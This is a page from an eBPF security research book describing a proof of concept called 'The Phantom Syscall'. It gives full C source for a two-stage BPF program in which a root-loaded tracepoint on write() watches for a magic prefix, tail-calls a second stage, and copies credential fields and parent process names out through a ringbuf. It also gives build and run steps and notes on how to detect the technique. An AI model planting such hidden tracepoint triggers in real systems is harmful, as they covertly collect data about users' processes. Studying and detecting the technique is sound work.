---
layout: book
title: "The Phantom Syscall"
date: 2025-02-03
poc_dir: dBPF-pocs/pocs/ch04-phantom-syscall
---

# The Phantom Syscall

> **See also**: [Full investigation notes in the book]({{ site.baseurl }}/book/act-1/chapter-4-the-phantom-syscall.html) · [POC source](https://github.com/mbhatt1/dBPF/tree/master/dBPF-pocs/pocs/ch04-phantom-syscall)

I was trying to see how far a tail-called BPF program could walk `task_struct` from a tracepoint on `sys_enter_write` before the verifier got unhappy. The idea was simple: a regular `write()` syscall carrying a magic prefix fires the tracepoint, which tail-calls a second stage that reads kernel-internal credential fields and exfils them via ringbuf. One syscall, three kernel-private values out.

What surprised me was how little the verifier pushed back. Reading `task->cred->uid`, `task->cred->euid`, and `task->real_parent->comm` through `BPF_CORE_READ` all went through. What it rejected were writes to `task_struct` — for instance, trying to swap `cred` pointers. So this is exfiltration, not privilege escalation, which is exactly the line BPF was drawn along: you can observe kernel state, you can't mutate the core task state.

## Mechanism

### Stage 1 — syscall tracepoint detects magic prefix

```c
SEC("tracepoint/syscalls/sys_enter_write")
int tp_write(struct trace_event_raw_sys_enter *ctx) {
    const char __user *buf = (const char __user *)ctx->args[1];
    size_t len = (size_t)ctx->args[2];

    char magic[8];
    if (len < sizeof(magic)) return 0;
    if (bpf_probe_read_user(magic, sizeof(magic), buf) < 0) return 0;
    if (__builtin_memcmp(magic, "PHANTOM\0", 8) != 0) return 0;

    // tail-call into stage 2
    bpf_tail_call(ctx, &jumps, 0);
    return 0;
}
```

### Stage 2 — read kernel cred + parent comm, emit ringbuf

```c
SEC("tracepoint/syscalls/sys_enter_write")
int tp_write_stage2(struct trace_event_raw_sys_enter *ctx) {
    struct task_struct *task = (void *)bpf_get_current_task();

    u32 uid  = BPF_CORE_READ(task, cred, uid.val);
    u32 euid = BPF_CORE_READ(task, cred, euid.val);

    char parent_comm[16] = {};
    struct task_struct *parent = BPF_CORE_READ(task, real_parent);
    BPF_CORE_READ_STR_INTO(&parent_comm, parent, comm);

    char payload[48] = {};
    bpf_probe_read_user(payload, sizeof(payload),
                        (void *)ctx->args[1] + 8);  // skip magic

    struct evt e = { .pid = bpf_get_current_pid_tgid() >> 32,
                     .uid = uid, .euid = euid };
    __builtin_memcpy(e.parent, parent_comm, 16);
    __builtin_memcpy(e.payload, payload, 48);
    bpf_ringbuf_output(&events, &e, sizeof(e), 0);
    return 0;
}
```

The loader registers stage 2 in a `BPF_MAP_TYPE_PROG_ARRAY` at slot 0 before attaching stage 1.

## Hook points

- `tracepoint/syscalls/sys_enter_write` (stage 1) — magic prefix detection + tail-call.
- `tracepoint/syscalls/sys_enter_write` (stage 2, manual-attach) — cred/parent reads + ringbuf emit.

## Reproduction

```bash
cd dBPF-pocs/pocs/ch04-phantom-syscall
make
sudo ./build/ch04-phantom-syscall &
# in a separate shell as an unprivileged user
sudo -u nobody /tmp/phantom  # writes "PHANTOM\0<payload>"
# expect:
# [phantom] pid=... uid=65534 euid=65534 parent=bash
#           payload='hello-from-unprivileged-user'
```

The unprivileged process issues exactly one `write()`. From its own userspace perspective, it never had access to `task->real_parent->comm`. With the loader running, all three fields are out.

## Detection

- `bpftool prog list` shows both stages and the PROG_ARRAY.
- `/sys/kernel/debug/tracing/events/syscalls/sys_enter_write/enable` will be set.
- Any seccomp filter that audits `bpf(2)` syscalls will see stage 2 being loaded.
- Behavioral: an unprivileged process issuing `write()`s with a fixed magic prefix is not normal. A grep on `bpf_tail_call` in loaded programs is fast.

## Scope

Class III primitive from chapter 20 (ringbuf exfil). Nothing in the kernel changes; three kernel-private fields are copied out. Seccomp that allows `write()` sees one syscall — which is exactly what seccomp was designed to see, and it still holds as designed. This primitive just lives in the gap that design leaves open.

---

**Related material**

- Full chapter: [Chapter 4 — The Phantom Syscall]({{ site.baseurl }}/book/act-1/chapter-4-the-phantom-syscall.html)
- POC source: [dBPF-pocs/pocs/ch04-phantom-syscall/](https://github.com/mbhatt1/dBPF/tree/master/dBPF-pocs/pocs/ch04-phantom-syscall)
- Harness entry: search for `Poc("ch04", ...)` in `dBPF-pocs/harness/proof.py`
